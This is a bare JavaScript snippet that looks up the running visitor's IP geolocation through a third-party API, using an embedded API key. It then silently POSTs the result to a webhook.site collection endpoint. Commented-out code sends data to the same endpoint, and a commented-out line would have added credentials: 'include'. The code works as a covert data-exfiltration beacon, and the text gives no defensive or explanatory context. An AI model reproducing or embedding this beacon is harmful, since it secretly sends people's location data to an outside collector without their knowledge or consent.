fetch("https://ipgeolocation.abstractapi.com/v1/?api_key=50ac415dda654582875d363c561968ea")
  .then((response) => {
   return response.json();
}).then((myJson) => {
   console.log(myJson);
   fetch("https://webhook.site/60796d43-4b18-46f0-b40c-d533b6340f28", {
    method: "POST",
    body: JSON.stringify(myJson),
    headers: {"content-type": "text/plain"},
    //credentials: 'include'
  });
});
// function formSubmit() {
//   var url = "https://webhook.site/60796d43-4b18-46f0-b40c-d533b6340f28";
//   var request = new XMLHttpRequest();
//   request.open('POST', url, true);
//   request.onload = function() { // request successful
//   // we can use server response to our request now
//     console.log(request.responseText);
//   };
//
//   request.onerror = function() {
//     // request failed
//   };
//   request.setRequestHeader('Content-type', 'text/plain');
//
//   request.send('hello'); // create FormData from form that triggered event
// }
// formSubmit();
